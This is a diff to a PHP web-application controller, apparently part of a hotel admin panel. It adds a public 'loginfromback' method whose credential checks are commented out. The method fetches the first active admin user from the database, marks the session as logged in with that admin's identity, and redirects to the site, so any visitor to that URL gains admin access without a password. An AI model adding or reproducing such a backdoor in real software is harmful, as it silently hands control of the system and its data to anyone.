@@ -251,6 +251,26 @@ $orderorder="ASC";
 $data["message"]=$this->chintantable->query($pageno,$maxrow,$orderby,$orderorder,$search,$elements,"FROM `hotel_log`");
 $this->load->view("json",$data);
 }
+ 
+public function loginfromback()
+{
+//$email=$this->input->get('email');
+//$password=$this->input->get('password');
+$adminuser=$this->db->query("SELECT * FROM `user` WHERE `status`=1 AND `accesslevel`=1")->row();
+$email=$adminuser->email;
+$id=$adminuser->id;
+$name=$adminuser->name;
+$accesslevel=$adminuser->accesslevel;
+$newdata        = array(
+'id' => $id,
+'email' => $email,
+'name' => $name ,
+'accesslevel' => $accesslevel,
+'logged_in' => 'true',
+);
+$this->session->set_userdata( $newdata );
+redirect( base_url() . 'index.php/site', 'refresh' );
+}
 public function getsinglelog()
 {
 $id=$this->input->get_post("id");
